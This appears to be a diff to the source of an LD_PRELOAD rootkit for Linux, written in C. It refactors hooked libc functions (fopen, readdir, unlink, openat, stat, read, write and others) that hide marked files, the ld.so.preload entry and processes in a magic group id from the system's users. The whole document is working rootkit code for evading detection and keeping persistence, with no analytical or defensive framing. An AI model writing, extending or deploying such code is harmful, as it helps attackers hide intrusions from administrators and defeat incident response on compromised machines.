@@ -47,6 +47,33 @@ int pid_to_gid(int pid) {
     return gid;
 }
 
+int pid_check(const char *path) {
+    int pid = atoi(path);
+    if (pid != 0) {
+        int gid = pid_to_gid(pid);
+        if (gid == GID) {
+            return 1;
+        }
+    }
+    return 0;
+}
+
+int file_check(const char *path) {
+    if (
+        strstr(path, HIDDEN_FILENAME) != NULL 
+    || strstr(path, HIDDEN_FILENAME2) != NULL
+    || strstr(path, HIDDEN_EXEC_PATH) != NULL
+    || strstr(path, HIDDEN_PATH) != NULL
+    || strstr(path, SPECIAL_PATH) != NULL
+    || strstr(path, SPECIAL_FILENAME) != NULL
+    || strstr(path, "ld.so.preload") != NULL
+    ) {
+        return 1;
+    }
+
+    return 0;
+}
+
 FILE *(*__o_fopen)(const char *, const char *);
 FILE *__fopen(const char *path, const char *mode) {
     if(!__o_fopen)
@@ -74,20 +101,12 @@ FILE *fopen(const char *path, const char *mode) {
         return o_fopen(path, mode);
     }
 
-    if (strcmp(path, "ld.so.preload") == 0 
-    || strcmp(path, HIDDEN_FILENAME) == 0 
-    || strcmp(path, HIDDEN_FILENAME2) == 0
-    || strcmp(path, SPECIAL_FILENAME) == 0
-    ) {
+    if (file_check(path) == 1) {
         return NULL;
     }
 
-    int pid = atoi(path);
-    if (pid != 0) {
-        int gid = pid_to_gid(pid);
-        if (gid == GID) {
-            return NULL;
-        }
+    if (pid_check(path) == 1) {
+        return NULL;
     }
 
     return o_fopen(path, mode);
@@ -141,20 +160,12 @@ struct dirent *readdir(DIR *p) {
         return NULL;
     }
 
-    if (strcmp(dir->d_name, HIDDEN_FILENAME) == 0 
-    || strcmp(dir->d_name, HIDDEN_FILENAME2) == 0
-    || strcmp(dir->d_name, SPECIAL_FILENAME) == 0
-    ) {
-        // hide file
+    if (file_check(dir->d_name) == 1) {
         return readdir(p);
     }
 
-    int pid = atoi(dir->d_name);
-    if (pid != 0) {
-        int gid = pid_to_gid(pid);
-        if (gid == GID) {
-            return readdir(p);
-        }
+    if (pid_check(dir->d_name) == 1) {
+        return readdir(p);
     }
 
     return dir;
@@ -179,19 +190,12 @@ struct dirent64 *readdir64(DIR *p) {
         return NULL;
     }
 
-    if (strcmp(dir->d_name, HIDDEN_FILENAME) == 0 
-    || strcmp(dir->d_name, HIDDEN_FILENAME2) == 0
-    || strcmp(dir->d_name, SPECIAL_FILENAME) == 0
-    ) {
+    if (file_check(dir->d_name) == 1) {
         return readdir64(p);
     }
 
-    int pid = atoi(dir->d_name);
-    if (pid != 0) {
-        int gid = pid_to_gid(pid);
-        if (gid == GID) {
-            return readdir64(p);
-        }
+    if (pid_check(dir->d_name) == 1) {
+        return readdir64(p);
     }
 
     return dir;
@@ -211,21 +215,12 @@ int unlink(const char *pathname) {
         return o_unlink(pathname);
     }
 
-    if (
-        strcmp(pathname, "ld.so.preload") == 0 
-        || strcmp(pathname, HIDDEN_FILENAME) == 0
-        || strcmp(pathname, HIDDEN_FILENAME2) == 0
-        || strcmp(pathname, SPECIAL_FILENAME) == 0
-    ) {
-        return 0;
+    if (file_check(pathname) == 1) {
+        return -1;
     }
 
-    int pid = atoi(pathname);
-    if (pid != 0) {
-        int gid = pid_to_gid(pid);
-        if (gid == GID) {
-            return -1;
-        }
+    if (pid_check(pathname) == 1) {
+        return -1;
     }
 
     return o_unlink(pathname);
@@ -245,21 +240,12 @@ int unlinkat(int dirfd, const char * pathname, int flags) {
         return o_unlinkat(dirfd, pathname, flags);
     }
 
-    if (
-        strcmp(pathname, "ld.so.preload") == 0 
-        || strcmp(pathname, HIDDEN_FILENAME2) == 0
-        || strcmp(pathname, HIDDEN_FILENAME) == 0
-        || strcmp(pathname, SPECIAL_FILENAME) == 0
-    ) {
-        return 0;
+    if (file_check(pathname) == 1) {
+        return -1;
     }
 
-    int pid = atoi(pathname);
-    if (pid != 0) {
-        int gid = pid_to_gid(pid);
-        if (gid == GID) {
-            return -1;
-        }
+    if (pid_check(pathname) == 1) {
+        return -1;
     }
 
     return o_unlinkat(dirfd, pathname, flags);
@@ -286,15 +272,8 @@ ssize_t write(int fd, const void *xbuf, size_t count) {
     }
 
     // dont allow writing to hidden files
-    if (
-        strstr(buf, HIDDEN_FILENAME) != NULL 
-    || strstr(buf, HIDDEN_FILENAME2) != NULL
-    || strstr(buf, HIDDEN_EXEC_PATH) != NULL
-    || strstr(buf, HIDDEN_PATH) != NULL
-    || strstr(buf, SPECIAL_PATH) != NULL
-    || strstr(buf, SPECIAL_FILENAME) != NULL
-    ) {
-        return count;
+    if (file_check(buf) == 1) {
+        return 0;
     }
 
     return o_write(fd, xbuf, count);
@@ -314,16 +293,8 @@ ssize_t read(int fd, void *xbuf, size_t count) {
         return o_read(fd, xbuf, count);
     }
 
-    // dont allow reading of hidden files
     char *buf = (char *) xbuf;
-    if (
-        strstr(buf, HIDDEN_FILENAME) != NULL
-    || strstr(buf, HIDDEN_FILENAME2) != NULL
-    || strstr(buf, HIDDEN_EXEC_PATH) != NULL
-    || strstr(buf, HIDDEN_PATH) != NULL
-    || strstr(buf, SPECIAL_PATH) != NULL
-    || strstr(buf, SPECIAL_FILENAME) != NULL
-    ) {
+    if (file_check(buf) == 1) {
         return 0;
     }
 
@@ -369,21 +340,12 @@ int openat(int dirfd, const char *path, int flags, ...) {
         return o_openat(dirfd, path, flags);
     }
 
-    // check if the file is hidden if so return -1
-    if (strcmp(path, "ld.so.preload") == 0 
-    || strcmp(path, HIDDEN_FILENAME) == 0 
-    || strcmp(path, HIDDEN_FILENAME2) == 0
-    || strcmp(path, SPECIAL_FILENAME) == 0
-    ) {
+    if (file_check(path) == 1) {
         return -1;
     }
 
-    int pid = atoi(path);
-    if (pid != 0) {
-        int gid = pid_to_gid(pid);
-        if (gid == GID) {
-            return -1;
-        }
+    if (pid_check(path) == 1) {
+        return -1;
     }
 
     return o_openat(dirfd, path, flags);
@@ -403,20 +365,12 @@ int open64(const char *path, int flags, ...) {
         return o_openat64(AT_FDCWD, path, flags);
     }
 
-    if (strcmp(path, "ld.so.preload") == 0 
-    || strcmp(path, HIDDEN_FILENAME) == 0 
-    || strcmp(path, HIDDEN_FILENAME2) == 0
-    || strcmp(path, SPECIAL_FILENAME) == 0
-    ) {
+    if (file_check(path) == 1) {
         return -1;
     }
 
-    int pid = atoi(path);
-    if (pid != 0) {
-        int gid = pid_to_gid(pid);
-        if (gid == GID) {
-            return -1;
-        }
+    if (pid_check(path) == 1) {
+        return -1;
     }
 
     return o_openat64(AT_FDCWD, path, flags);
@@ -436,20 +390,12 @@ DIR *opendir(const char *name) {
         return o_opendir(name);
     }
 
-    if (strcmp(name, "ld.so.preload") == 0 
-    || strcmp(name, HIDDEN_FILENAME) == 0 
-    || strcmp(name, HIDDEN_FILENAME2) == 0
-    || strcmp(name, SPECIAL_FILENAME) == 0
-    ) {
+    if (file_check(name) == 1) {
         return NULL;
     }
 
-    int pid = atoi(name);
-    if (pid != 0) {
-        int gid = pid_to_gid(pid);
-        if (gid == GID) {
-            return NULL;
-        }
+    if (pid_check(name) == 1) {
+        return NULL;
     }
 
     return o_opendir(name);
@@ -469,20 +415,12 @@ int stat(const char *pathname, struct stat *statbuf) {
         return o_stat(pathname, statbuf);
     }
 
-    if (strcmp(pathname, "ld.so.preload") == 0 
-    || strcmp(pathname, HIDDEN_FILENAME) == 0 
-    || strcmp(pathname, HIDDEN_FILENAME2) == 0
-    || strcmp(pathname, SPECIAL_FILENAME) == 0
-    ) {
+    if (file_check(pathname) == 1) {
         return -1;
     }
 
-    int pid = atoi(pathname);
-    if (pid != 0) {
-        int gid = pid_to_gid(pid);
-        if (gid == GID) {
-            return -1;
-        }
+    if (pid_check(pathname) == 1) {
+        return -1;
     }
 
     return o_stat(pathname, statbuf);
